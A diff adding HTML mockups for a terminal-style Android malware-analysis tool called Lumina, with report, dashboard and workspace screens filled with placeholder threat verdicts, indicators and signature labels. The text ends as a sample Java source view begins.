@@ -1,0 +1,677 @@
+<!-- Security Report (TUI) -->
+<!DOCTYPE html>
+
+<html class="dark" lang="en"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Lumina - TUI Security Report</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&amp;family=Playfair+Display:ital,wght@0,700;0,900;1,700;1,900&amp;family=Plus+Jakarta+Sans:wght@400&amp;family=Space+Grotesk:wght@500&amp;display=swap" rel="stylesheet"/>
+<script id="tailwind-config">tailwind.config = {darkMode: "class", theme: {extend: {colors: {"on-surface": "#e5e2da", outline: "#8e9196", "surface-dim": "#14140f", "surface-container": "#20201a", background: "#14140f", terracotta: "#e2725b", sage: "#b2d8d8", "on-background": "#e5e2da", "on-tertiary-fixed-variant": "#07504a", "tertiary-fixed": "#b0eee6", "on-surface-variant": "#c4c6cc", "inverse-on-surface": "#31312b", "secondary-container": "#339acc", "on-error-container": "#ffdad6", "surface-container-highest": "#35352f", "primary-fixed-dim": "#bbc7da", primary: "#bbc7da", "surface-variant": "#35352f", "surface-tint": "#bbc7da", "inverse-primary": "#535f6f", "on-primary-container": "#8591a2", "surface-container-high": "#2a2a25", surface: "#14140f", "outline-variant": "#44474c", "tertiary-container": "#002f2b", "on-primary-fixed": "#101c2a", "inverse-surface": "#e5e2da", "on-primary": "#253140", "surface-container-lowest": "#0e0e0a", "on-tertiary-fixed": "#00201d", "surface-container-low": "#1c1c17", "on-secondary-container": "#002d41", "surface-bright": "#3a3933", "tertiary-fixed-dim": "#95d2ca", "on-secondary": "#00344a", tertiary: "#95d2ca", "error-container": "#93000a", "primary-fixed": "#d7e3f6", "on-tertiary": "#003733", "primary-container": "#1e2a38", "secondary-fixed": "#c5e7ff", "on-secondary-fixed-variant": "#004c6a", "on-tertiary-container": "#5f9b94", "on-secondary-fixed": "#001e2d", "secondary-fixed-dim": "#7fd0ff", secondary: "#7fd0ff", error: "#ffb4ab", "on-error": "#690005", "on-primary-fixed-variant": "#3c4857"}, borderRadius: {DEFAULT: "0.25rem", lg: "0.5rem", xl: "0.75rem", full: "9999px"}, fontFamily: {"body-md": ["JetBrains Mono"], "headline-lg": ["Playfair Display"], "code-md": ["JetBrains Mono"], headline: ["Playfair Display"], display: ["Playfair Display"], body: ["Plus Jakarta Sans"], label: ["Space Grotesk"]}, fontSize: {}}}};</script>
+<style>
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background-color: #14140f;
+        }
+        .tui-border {
+            border: 1px solid rgba(229, 226, 218, 0.2);
+        }
+        .tui-border-accent {
+            border: 1px solid #e2725b;
+        }
+        .tui-nav-active {
+            color: #14140f;
+            background-color: #e5e2da;
+        }
+        /* Custom scrollbar for TUI aesthetic */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #14140f;
+            border-left: 1px solid rgba(229, 226, 218, 0.1);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(229, 226, 218, 0.2);
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(229, 226, 218, 0.3);
+        }
+    </style>
+</head>
+<body class="text-on-surface antialiased selection:bg-on-surface selection:text-background">
+<div class="flex flex-col h-screen w-full overflow-hidden">
+<!-- TUI Top Navigation -->
+<header class="border-b tui-border shrink-0">
+<div class="flex items-center justify-between px-6 h-12">
+<div class="flex items-center gap-8">
+<div class="flex items-center gap-2">
+<span class="material-symbols-outlined text-lg">radar</span>
+<span class="font-bold tracking-widest">LUMINA_SYS_V2.1</span>
+</div>
+<nav class="flex gap-4 text-sm font-bold">
+<a class="px-2 py-1 hover:bg-on-surface/10" href="#">[ DASHBOARD ]</a>
+<a class="px-2 py-1 hover:bg-on-surface/10" href="#">[ WORKSPACE ]</a>
+<a class="px-2 py-1 hover:bg-on-surface/10" href="#">[ EMULATION ]</a>
+<a class="px-2 py-1 tui-nav-active" href="#">[ REPORTS ]</a>
+</nav>
+</div>
+<div class="flex items-center gap-6 text-xs opacity-70">
+<div class="flex items-center gap-4">
+<span>CPU: 12%</span>
+<span>MEM: 2.4GB</span>
+<span>NET: SECURE</span>
+</div>
+<div class="flex items-center gap-2 border-l tui-border pl-6">
+<span class="material-symbols-outlined text-sm">person</span>
+<span>ANALYST_01</span>
+</div>
+</div>
+</div>
+</header>
+<!-- Main TUI Content -->
+<main class="flex-1 overflow-y-auto p-6 md:p-10">
+<div class="max-w-6xl mx-auto space-y-8">
+<!-- Terminal Header -->
+<div class="flex flex-col md:flex-row justify-between items-end gap-4 border-b tui-border pb-8">
+<div>
+<div class="text-[10px] uppercase tracking-[0.3em] opacity-50 mb-2">/root/workspace/report_v2.1</div>
+<h1 class="font-headline-lg text-5xl md:text-6xl text-on-surface">Analysis Complete</h1>
+<div class="mt-4 flex flex-wrap gap-4 font-code-md text-xs opacity-60">
+<span class="border tui-border px-2">ID: APK_IDENTIFIER</span>
+<span>FILE: com.example.vulnerable_app_v2.1.apk</span>
+<span>HASH: 8f4e912c9a...</span>
+</div>
+</div>
+<div class="flex gap-4 font-bold text-xs">
+<button class="border tui-border px-4 py-2 hover:bg-on-surface hover:text-background transition-colors">[ SHARE ]</button>
+<button class="border tui-border px-4 py-2 hover:bg-on-surface hover:text-background transition-colors">[ EXPORT_PDF ]</button>
+</div>
+</div>
+<!-- TUI Main Grid -->
+<div class="grid grid-cols-12 gap-6">
+<!-- Primary Verdict Column -->
+<div class="col-span-12 lg:col-span-8 space-y-6">
+<!-- Verdict TUI Block -->
+<div class="border tui-border-accent p-8 relative overflow-hidden">
+<div class="absolute top-0 right-0 bg-terracotta text-background px-3 py-1 font-bold text-[10px] tracking-tighter">ALERT_LEVEL: 05</div>
+<div class="flex flex-col md:flex-row items-center gap-8">
+<div class="shrink-0 border-4 border-terracotta/20 p-4">
+<span class="material-symbols-outlined text-terracotta text-7xl" style="font-variation-settings: 'FILL' 1;">warning</span>
+</div>
+<div class="flex-1">
+<h3 class="text-terracotta text-xs font-bold uppercase tracking-[0.4em] mb-2">!! SYSTEM_VERDICT !!</h3>
+<div class="text-terracotta text-6xl font-black mb-6 tracking-tighter">MALICIOUS</div>
+<div class="space-y-4 font-code-md text-sm leading-relaxed border-t border-terracotta/20 pt-4">
+<p><span class="text-terracotta">[ DETECTION ]</span> Application exhibits high-confidence patterns of data exfiltration and dynamic payload execution.</p>
+<p><span class="text-terracotta">[ BEHAVIOR ]</span> Automated triggers identified unauthorized network tunneling to unsanctioned geographic regions.</p>
+</div>
+</div>
+</div>
+</div>
+<!-- Evidence TUI Section -->
+<div class="space-y-4">
+<div class="flex items-center gap-3">
+<span class="text-sage font-bold">&gt;&gt;</span>
+<h3 class="text-xs uppercase tracking-widest font-bold">EVIDENCE_ENRICHMENT_LOG</h3>
+</div>
+<div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+<!-- Card Critical -->
+<div class="border tui-border p-4 bg-on-surface/[0.02]">
+<div class="flex justify-between items-center mb-4 border-b tui-border pb-2">
+<span class="font-bold text-terracotta text-xs">[ CRITICAL_NODE ]</span>
+<span class="text-[10px] opacity-50">#001</span>
+</div>
+<div class="space-y-2 text-xs font-code-md">
+<div class="flex justify-between">
+<span class="opacity-50">DOMAIN:</span>
+<span class="text-on-surface">api.stealth-update.ru</span>
+</div>
+<div class="flex justify-between">
+<span class="opacity-50">IP_ADDR:</span>
+<span class="text-on-surface">185.15.22.X</span>
+</div>
+<div class="flex justify-between pt-2 mt-2 border-t border-outline/20">
+<span class="opacity-50">REPUTATION:</span>
+<span class="text-terracotta font-bold">BLACKLISTED_RU</span>
+</div>
+</div>
+</div>
+<!-- Card Benign -->
+<div class="border tui-border p-4 bg-on-surface/[0.02]">
+<div class="flex justify-between items-center mb-4 border-b tui-border pb-2">
+<span class="font-bold text-sage text-xs">[ BENIGN_NODE ]</span>
+<span class="text-[10px] opacity-50">#002</span>
+</div>
+<div class="space-y-2 text-xs font-code-md">
+<div class="flex justify-between">
+<span class="opacity-50">DOMAIN:</span>
+<span class="text-on-surface">analytics.google.com</span>
+</div>
+<p class="text-[10px] opacity-50 leading-relaxed mt-2 border-t border-outline/20 pt-2">
+                                        Standard telemetry endpoints detected. No protocol anomalies found in TLS handshake.
+                                    </p>
+</div>
+</div>
+</div>
+</div>
+</div>
+<!-- Sidebar TUI Stats -->
+<div class="col-span-12 lg:col-span-4 space-y-6">
+<div class="border tui-border p-6 space-y-8">
+<div class="flex items-center justify-between border-b tui-border pb-4">
+<h4 class="text-xs font-bold tracking-widest">[ KEY_METRICS ]</h4>
+<span class="material-symbols-outlined text-sm opacity-50">analytics</span>
+</div>
+<div class="space-y-6">
+<div>
+<div class="flex justify-between text-xs mb-2">
+<span class="opacity-50">CVSS_SCORE</span>
+<span class="text-terracotta font-bold">8.4</span>
+</div>
+<div class="h-4 border tui-border p-[1px]">
+<div class="h-full bg-terracotta" style="width: 84%"></div>
+</div>
+</div>
+<div>
+<div class="flex justify-between text-xs mb-2">
+<span class="opacity-50">FLAGGED_PERMS</span>
+<span class="text-on-surface font-bold">6/12</span>
+</div>
+<div class="h-4 border tui-border p-[1px]">
+<div class="h-full bg-on-surface/40" style="width: 50%"></div>
+</div>
+</div>
+<div class="pt-6 border-t tui-border">
+<div class="text-[10px] opacity-50 mb-3">INTEGRITY_STATUS</div>
+<div class="flex items-center gap-2 text-sage text-xs font-bold">
+<span class="material-symbols-outlined text-sm">verified</span>
+<span>FRIDA_HOOKS: ACTIVE</span>
+</div>
+</div>
+</div>
+</div>
+<!-- Synthesis Block -->
+<div class="border tui-border p-6 bg-on-surface/[0.03]">
+<div class="flex items-center gap-2 mb-4 border-b tui-border pb-2">
+<span class="material-symbols-outlined text-xs text-sage">terminal</span>
+<h4 class="text-[10px] font-bold tracking-widest">AI_SYNTHESIS_EXEC</h4>
+</div>
+<div class="text-xs font-code-md leading-relaxed opacity-80">
+<p>Static analysis reveals custom encryption routine in <span class="text-sage">libnative-lib.so</span>. Payloads are likely decoded post-initialization.</p>
+<p class="mt-4 border-l-2 border-terracotta pl-3 font-bold">REC: DO NOT DEPLOY TO PRODUCTION ENV.</p>
+</div>
+</div>
+</div>
+</div>
+<!-- Footer TUI Stats -->
+<footer class="mt-12 pt-6 border-t tui-border flex flex-col md:flex-row justify-between items-center gap-4 text-[10px] font-code-md opacity-40 uppercase tracking-widest">
+<div class="flex gap-6">
+<span>GEN: LUMINA-SYSTEM-AUTO</span>
+<span>LOC: DC-04-EAST</span>
+</div>
+<div class="flex gap-6">
+<span>UID: 2023-11-24 14:02:11Z</span>
+<span>CRC: 0x8F4E912C</span>
+</div>
+</footer>
+</div>
+</main>
+</div>
+</body></html>
+
+<!-- Forensic Dashboard (TUI) -->
+<!DOCTYPE html>
+
+<html class="dark" lang="en"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Lumina - Forensic Terminal</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&amp;family=Space+Grotesk:wght@400;500;600;700&amp;family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,400;1,700;1,900&amp;family=JetBrains+Mono:wght@400;500;700&amp;display=swap" rel="stylesheet"/>
+<script id="tailwind-config">tailwind.config = {darkMode: "class", theme: {extend: {colors: {background: "#14140f", surface: "#14140f", "on-surface": "#e5e2da", "on-surface-variant": "#c4c6cc", primary: "#bbc7da", error: "#ffb4ab", outline: "#8e9196", "accent-teal": "#b2d8d8", "accent-red": "#e2725b", "on-tertiary-fixed-variant": "#07504a", "tertiary-fixed": "#b0eee6", "inverse-on-surface": "#31312b", "secondary-container": "#339acc", "on-error-container": "#ffdad6", "surface-container-highest": "#35352f", "primary-fixed-dim": "#bbc7da", "surface-container": "#20201a", "surface-variant": "#35352f", "surface-tint": "#bbc7da", "inverse-primary": "#535f6f", "on-primary-container": "#8591a2", "surface-container-high": "#2a2a25", "outline-variant": "#44474c", "tertiary-container": "#002f2b", "on-primary-fixed": "#101c2a", "inverse-surface": "#e5e2da", "on-primary": "#253140", "surface-container-lowest": "#0e0e0a", "on-tertiary-fixed": "#00201d", "surface-container-low": "#1c1c17", "on-secondary-container": "#002d41", "on-background": "#e5e2da", "surface-bright": "#3a3933", "tertiary-fixed-dim": "#95d2ca", "on-secondary": "#00344a", tertiary: "#95d2ca", "error-container": "#93000a", "primary-fixed": "#d7e3f6", "on-tertiary": "#003733", "surface-dim": "#14140f", "primary-container": "#1e2a38", "secondary-fixed": "#c5e7ff", "on-secondary-fixed-variant": "#004c6a", "on-tertiary-container": "#5f9b94", "on-secondary-fixed": "#001e2d", "secondary-fixed-dim": "#7fd0ff", secondary: "#7fd0ff", "on-error": "#690005", "on-primary-fixed-variant": "#3c4857"}, fontFamily: {mono: ["JetBrains Mono", "monospace"], brand: ["Playfair Display", "serif"], headline: ["Playfair Display"], display: ["Playfair Display"], body: ["Plus Jakarta Sans"], label: ["Space Grotesk"]}, fontSize: {}, borderRadius: {DEFAULT: "0.25rem", lg: "0.5rem", xl: "0.75rem", full: "9999px"}}}};</script>
+<style>
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background-color: #14140f;
+            color: #e5e2da;
+        }
+        .tui-border {
+            border: 1px solid #44474c;
+        }
+        .tui-border-accent {
+            border: 1px solid #b2d8d8;
+        }
+        .tui-border-error {
+            border: 1px solid #e2725b;
+        }
+        .ascii-corner {
+            position: relative;
+        }
+        .ascii-corner::before {
+            content: '+';
+            position: absolute;
+            top: -6px;
+            left: -4px;
+            background: #14140f;
+            padding: 0 2px;
+            font-size: 14px;
+            color: #44474c;
+        }
+        .scanline {
+            width: 100%;
+            height: 100px;
+            z-index: 10;
+            background: linear-gradient(0deg, rgba(0, 0, 0, 0) 0%, rgba(255, 255, 255, 0.02) 50%, rgba(0, 0, 0, 0) 100%);
+            opacity: 0.1;
+            position: fixed;
+            bottom: 100%;
+            pointer-events: none;
+            animation: scanline 10s linear infinite;
+        }
+        @keyframes scanline {
+            0% { bottom: 100%; }
+            100% { bottom: -100px; }
+        }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #14140f; }
+        ::-webkit-scrollbar-thumb { background: #44474c; }
+    </style>
+</head>
+<body class="overflow-hidden h-screen flex flex-col selection:bg-accent-teal selection:text-background">
+<div class="scanline"></div>
+<!-- TUI Header / Top Nav -->
+<header class="border-b border-outline bg-background shrink-0 px-6 py-4 flex items-center justify-between">
+<div class="flex items-center gap-8">
+<div class="flex flex-col">
+<span class="font-brand text-2xl font-black leading-none">LUMINA</span>
+<span class="text-[9px] uppercase tracking-[0.4em] opacity-60">Technical Forensics</span>
+</div>
+<nav class="flex items-center gap-2">
+<a class="px-3 py-1 bg-accent-teal text-background font-bold text-sm" href="#">[ DASHBOARD ]</a>
+<a class="px-3 py-1 text-on-surface-variant hover:text-on-surface text-sm transition-colors" href="#">[ WORKSPACE ]</a>
+<a class="px-3 py-1 text-on-surface-variant hover:text-on-surface text-sm transition-colors" href="#">[ EMULATION ]</a>
+<a class="px-3 py-1 text-on-surface-variant hover:text-on-surface text-sm transition-colors" href="#">[ REPORTS ]</a>
+</nav>
+</div>
+<div class="flex items-center gap-6 text-[11px]">
+<div class="flex items-center gap-2">
+<span class="w-2 h-2 rounded-full bg-accent-teal animate-pulse"></span>
+<span class="uppercase tracking-widest text-accent-teal">SYS_ACTIVE</span>
+</div>
+<div class="text-right border-l border-outline pl-6">
+<span class="block font-bold">OP: ADMIN_USER</span>
+<span class="block text-on-surface-variant">LEVEL_04_CLEARANCE</span>
+</div>
+</div>
+</header>
+<!-- Main Terminal Area -->
+<main class="flex-1 overflow-y-auto p-6 space-y-6">
+<!-- Dashboard Breadcrumb/Status -->
+<div class="flex items-center justify-between text-[11px] uppercase tracking-widest text-on-surface-variant">
+<span>&gt; LUMINA_ROOT / ANALYTICS / DASHBOARD_MAIN</span>
+<span>DATE: 2024.10.27_14:32:01_UTC</span>
+</div>
+<div class="grid grid-cols-12 gap-6">
+<!-- RISK PROFILE BLOCK -->
+<div class="col-span-12 lg:col-span-8 tui-border p-6 relative">
+<div class="absolute -top-3 left-6 bg-background px-2 text-[10px] text-accent-red font-bold uppercase tracking-tighter">
+                    [ MODULE: RISK_HEURISTICS ]
+                </div>
+<div class="flex flex-col md:flex-row gap-10">
+<div class="w-48 h-48 flex-shrink-0 flex flex-col items-center justify-center tui-border-error relative">
+<div class="absolute inset-2 border border-dashed border-accent-red/30"></div>
+<span class="text-5xl font-black text-accent-red">87</span>
+<span class="text-[10px] text-accent-red/80 font-bold mt-1">CRITICAL_THREAT</span>
+</div>
+<div class="flex-1 space-y-6">
+<div>
+<div class="text-[10px] text-on-surface-variant uppercase mb-2">Primary Detection Vector</div>
+<div class="bg-surface p-3 tui-border border-accent-teal/20 text-accent-teal text-sm">
+                                com.malware.intent.ACTION_SEND
+                            </div>
+</div>
+<div class="grid grid-cols-2 gap-4">
+<div class="tui-border p-3">
+<div class="text-[9px] text-on-surface-variant uppercase mb-1">Confidence</div>
+<div class="text-xl font-bold">94.2%</div>
+</div>
+<div class="tui-border p-3">
+<div class="text-[9px] text-on-surface-variant uppercase mb-1">Flag_Count</div>
+<div class="text-xl font-bold">12_OBJ</div>
+</div>
+</div>
+</div>
+</div>
+<div class="mt-6 flex justify-end">
+<button class="px-4 py-1 tui-border text-[10px] uppercase font-bold hover:bg-on-surface hover:text-background transition-all">
+                        RUN_RECALCULATION
+                    </button>
+</div>
+</div>
+<!-- ACTIVE SIGNATURES BLOCK -->
+<div class="col-span-12 lg:col-span-4 tui-border p-6 relative">
+<div class="absolute -top-3 left-6 bg-background px-2 text-[10px] text-on-surface-variant font-bold uppercase">
+                    [ SIG_DB_V2.0 ]
+                </div>
+<div class="space-y-3 mt-2">
+<div class="flex items-center justify-between p-3 bg-accent-red/5 tui-border-error">
+<span class="text-xs font-bold text-accent-red">CRYPT_WEAKNESS</span>
+<span class="material-symbols-outlined text-sm text-accent-red">priority_high</span>
+</div>
+<div class="flex items-center justify-between p-3 bg-surface tui-border">
+<span class="text-xs font-bold">DYNAMIC_LOAD</span>
+<span class="material-symbols-outlined text-sm">settings_input_component</span>
+</div>
+<div class="flex items-center justify-between p-3 bg-surface tui-border">
+<span class="text-xs font-bold">HARDCODED_IP_ADR</span>
+<span class="material-symbols-outlined text-sm">public</span>
+</div>
+<div class="flex items-center justify-between p-3 bg-surface tui-border">
+<span class="text-xs font-bold">SSL_PINNING_BYPASS</span>
+<span class="material-symbols-outlined text-sm">security</span>
+</div>
+</div>
+<button class="w-full mt-6 py-2 tui-border border-dashed text-[10px] uppercase font-bold text-on-surface-variant hover:text-on-surface transition-colors">
+                    EXPAND_FULL_REPORT.TXT
+                </button>
+</div>
+<!-- ANALYSIS QUEUE TABLE -->
+<div class="col-span-12 lg:col-span-8 tui-border relative">
+<div class="absolute -top-3 left-6 bg-background px-2 text-[10px] text-on-surface-variant font-bold uppercase">
+                    [ ARTIFACT_QUEUE ]
+                </div>
+<div class="overflow-x-auto">
+<table class="w-full text-left border-collapse">
+<thead>
+<tr class="border-b border-outline">
+<th class="p-4 text-[10px] uppercase text-on-surface-variant">Artifact_ID</th>
+<th class="p-4 text-[10px] uppercase text-on-surface-variant">Timestamp</th>
+<th class="p-4 text-[10px] uppercase text-on-surface-variant">State</th>
+<th class="p-4 text-[10px] uppercase text-on-surface-variant">Risk_Lvl</th>
+</tr>
+</thead>
+<tbody class="divide-y divide-outline/30">
+<tr class="hover:bg-surface transition-colors cursor-pointer group">
+<td class="p-4 text-xs flex items-center gap-2">
+<span class="text-accent-teal group-hover:animate-pulse">&gt;</span> payload_v2.apk
+                                </td>
+<td class="p-4 text-xs opacity-60">2m_AGO</td>
+<td class="p-4 text-xs text-accent-teal">PARSED</td>
+<td class="p-4"><span class="bg-accent-red text-background px-2 py-0.5 text-[9px] font-bold">CRIT</span></td>
+</tr>
+<tr class="hover:bg-surface transition-colors cursor-pointer group">
+<td class="p-4 text-xs flex items-center gap-2">
+<span class="text-accent-teal group-hover:animate-pulse">&gt;</span> classes.dex
+                                </td>
+<td class="p-4 text-xs opacity-60">1h_AGO</td>
+<td class="p-4 text-xs text-accent-teal">DECOMP</td>
+<td class="p-4"><span class="tui-border border-accent-teal text-accent-teal px-2 py-0.5 text-[9px] font-bold">LOW</span></td>
+</tr>
+<tr class="hover:bg-surface transition-colors cursor-pointer group">
+<td class="p-4 text-xs flex items-center gap-2">
+<span class="text-accent-teal group-hover:animate-pulse">&gt;</span> AndroidManifest.xml
+                                </td>
+<td class="p-4 text-xs opacity-60">3h_AGO</td>
+<td class="p-4 text-xs text-accent-teal">AUDIT</td>
+<td class="p-4"><span class="tui-border border-on-surface-variant text-on-surface-variant px-2 py-0.5 text-[9px] font-bold">MED</span></td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<!-- ENGINE STATUS -->
+<div class="col-span-12 lg:col-span-4 space-y-6">
+<div class="tui-border p-5 relative">
+<div class="absolute -top-3 left-6 bg-background px-2 text-[10px] text-accent-teal font-bold uppercase">
+                        [ ENGINE_STATUS ]
+                    </div>
+<div class="space-y-4">
+<div class="flex items-center justify-between">
+<div>
+<span class="text-[9px] text-on-surface-variant uppercase block">Frida_Srv</span>
+<span class="text-xs font-bold text-accent-teal">CONNECTED [P:27042]</span>
+</div>
+<div class="h-1 w-12 bg-accent-teal/20 overflow-hidden">
+<div class="h-full bg-accent-teal w-full animate-pulse"></div>
+</div>
+</div>
+<div class="flex items-center justify-between">
+<div>
+<span class="text-[9px] text-on-surface-variant uppercase block">LLM_Core</span>
+<span class="text-xs font-bold">SYNTHESIZING [Llama3]</span>
+</div>
+<div class="h-1 w-12 bg-on-surface-variant/20 overflow-hidden">
+<div class="h-full bg-on-surface-variant w-1/2 animate-pulse"></div>
+</div>
+</div>
+<div class="pt-4 border-t border-outline/30">
+<span class="text-[9px] text-on-surface-variant uppercase block mb-2">Memory_Map</span>
+<div class="flex items-center gap-4">
+<span class="text-xs font-bold">4.2/8.0 GB</span>
+<div class="flex-1 h-2 bg-surface tui-border p-[1px]">
+<div class="h-full bg-accent-teal w-[52%]"></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<button class="w-full py-4 bg-on-surface text-background font-bold text-xs uppercase tracking-[0.2em] hover:bg-accent-teal transition-all">
+                    UPLOAD_NEW_ARTIFACT (APK)
+                </button>
+</div>
+</div>
+</main>
+<!-- Footer Status Bar -->
+<footer class="h-8 border-t border-outline bg-surface px-6 flex items-center justify-between text-[10px] text-on-surface-variant uppercase shrink-0">
+<div class="flex items-center gap-6">
+<span>Terminal: TTY_7</span>
+<span class="text-accent-teal">Secure_Channel: AES-256-GCM</span>
+</div>
+<div class="flex items-center gap-6">
+<span>Lat: 12ms</span>
+<span>Lumina_OS v4.11.0</span>
+</div>
+</footer>
+</body></html>
+
+<!-- Analysis Workspace (TUI) -->
+<!DOCTYPE html>
+
+<html class="dark" lang="en"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Lumina - TUI Forensic Suite</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&amp;family=Playfair+Display:ital,wght@0,400;0,700;0,900;1,400&amp;family=Plus+Jakarta+Sans:wght@400;500;600;700&amp;family=Space+Grotesk:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
+<script id="tailwind-config">tailwind.config = {darkMode: "class", theme: {extend: {colors: {"on-surface": "#e5e2da", "on-secondary-fixed-variant": "#004c6a", "on-error-container": "#ffdad6", "primary-fixed-dim": "#bbc7da", tertiary: "#95d2ca", secondary: "#7fd0ff", "primary-container": "#1e2a38", "surface-container-lowest": "#0e0e0a", "tertiary-container": "#002f2b", "on-secondary": "#00344a", "inverse-surface": "#e5e2da", "on-secondary-fixed": "#001e2d", "on-secondary-container": "#002d41", outline: "#8e9196", "on-primary": "#253140", "on-tertiary-fixed-variant": "#07504a", "on-primary-fixed": "#101c2a", "surface-variant": "#35352f", "surface-dim": "#14140f", "surface-tint": "#bbc7da", "secondary-fixed": "#c5e7ff", error: "#ffb4ab", "on-error": "#690005", "primary-fixed": "#d7e3f6", "tertiary-fixed": "#b0eee6", "error-container": "#93000a", "on-tertiary-fixed": "#00201d", primary: "#bbc7da", "surface-container": "#20201a", background: "#14140f", "on-primary-container": "#8591a2", "surface-bright": "#3a3933", "tertiary-fixed-dim": "#95d2ca", "inverse-primary": "#535f6f", "surface-container-highest": "#35352f", "secondary-fixed-dim": "#7fd0ff", "inverse-on-surface": "#31312b", "surface-container-high": "#2a2a25", "outline-variant": "#44474c", surface: "#14140f", "secondary-container": "#339acc", "on-primary-fixed-variant": "#3c4857", "surface-container-low": "#1c1c17", "on-tertiary": "#003733", "on-surface-variant": "#c4c6cc", "on-tertiary-container": "#5f9b94", "on-background": "#e5e2da"}, borderRadius: {DEFAULT: "0.25rem", lg: "0.5rem", xl: "0.75rem", full: "9999px"}, spacing: {unit: "8px", gutter: "16px", "margin-desktop": "24px", "stack-overlap": "-12px"}, fontFamily: {"body-md": ["JetBrains Mono"], "label-sm": ["JetBrains Mono"], "headline-lg": ["JetBrains Mono"], "body-lg": ["JetBrains Mono"], "headline-md": ["JetBrains Mono"], "code-md": ["JetBrains Mono"], "display-lg": ["JetBrains Mono"], headline: ["Playfair Display"], display: ["Playfair Display"], body: ["Plus Jakarta Sans"], label: ["Space Grotesk"]}, fontSize: {}}}};</script>
+<style>
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: #14140f;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background-color: #35352f;
+        }
+        .tui-border {
+            border: 1px solid #35352f;
+        }
+        .tui-border-b {
+            border-bottom: 1px solid #35352f;
+        }
+        .tui-border-r {
+            border-right: 1px solid #35352f;
+        }
+        .tui-panel {
+            background-color: #14140f;
+        }
+    </style>
+</head>
+<body class="bg-background text-on-surface font-code-md antialiased h-screen flex flex-col overflow-hidden">
+<!-- Top Navigation Bar (TUI Style) -->
+<nav class="h-12 bg-surface-container-low tui-border-b flex items-center px-4 justify-between shrink-0 z-50">
+<div class="flex items-center gap-6">
+<div class="flex items-center gap-2">
+<span class="text-tertiary font-bold">[</span>
+<span class="text-on-surface uppercase tracking-widest text-[14px]">Lumina_OS</span>
+<span class="text-tertiary font-bold">]</span>
+</div>
+<div class="flex items-center gap-1 text-[12px]">
+<a class="px-3 py-1 hover:bg-surface-container text-outline hover:text-on-surface transition-colors" href="#">[ DASHBOARD ]</a>
+<a class="px-3 py-1 bg-surface-container-high text-tertiary font-bold" href="#">[ WORKSPACE ]</a>
+<a class="px-3 py-1 hover:bg-surface-container text-outline hover:text-on-surface transition-colors" href="#">[ EMULATION ]</a>
+<a class="px-3 py-1 hover:bg-surface-container text-outline hover:text-on-surface transition-colors" href="#">[ REPORTS ]</a>
+</div>
+</div>
+<div class="flex items-center gap-4 text-[11px] text-outline">
+<div class="flex items-center gap-2">
+<span class="material-symbols-outlined text-[16px]">account_circle</span>
+<span>ROOT@LOCAL_HOST</span>
+</div>
+<div class="w-px h-4 bg-outline-variant"></div>
+<span>2024-05-24 14:02:11</span>
+</div>
+</nav>
+<!-- Main Content Area -->
+<main class="flex-1 flex flex-col overflow-hidden">
+<!-- Breadcrumb / System Status Strip -->
+<div class="h-8 bg-surface-container-low tui-border-b px-4 flex items-center justify-between text-[11px] shrink-0">
+<div class="flex items-center gap-2">
+<span class="text-outline">PATH:</span>
+<span class="text-on-surface">/mnt/targets/analysis/com.example.malicious_payload.apk</span>
+<span class="px-2 py-0.5 bg-error/10 text-error border border-error/30 text-[10px] ml-4">THREAT_LEVEL: CRITICAL</span>
+</div>
+<div class="flex gap-4">
+<span class="text-tertiary">UPTIME: 04:12:44</span>
+<span class="text-outline">CPU: 12%</span>
+</div>
+</div>
+<!-- TUI Multi-Pane Workspace -->
+<div class="flex-1 flex overflow-hidden">
+<!-- Left Side: Code and Findings (Vertical Stack) -->
+<div class="flex-1 flex flex-col tui-border-r overflow-hidden">
+<!-- Code Editor Pane -->
+<div class="flex-1 flex flex-col overflow-hidden">
+<div class="h-8 bg-surface-container px-4 flex items-center justify-between tui-border-b text-[11px]">
+<div class="flex items-center gap-2">
+<span class="material-symbols-outlined text-[14px] text-tertiary">description</span>
+<span>SOURCE_VIEW: MainActivity.java</span>
+</div>
+<div class="flex gap-3 text-outline">
+<span class="hover:text-on-surface cursor-pointer underline">DECOMPILE</span>
+<span class="hover:text-on-surface cursor-pointer underline">STRINGS</span>
+<span class="text-on-surface">RO</span>
+</div>
+</div>
+<div class="flex-1 p-4 overflow-auto custom-scrollbar bg-black/10">
+<pre class="text-[13px] leading-relaxed"><code class="language-java">
+<span class="text-tertiary">package</span> com.example.malware;
+
+<span class="text-tertiary">public class</span> MainActivity <span class="text-tertiary">extends</span> Activity {
+    <span class="text-tertiary">@Override</span>
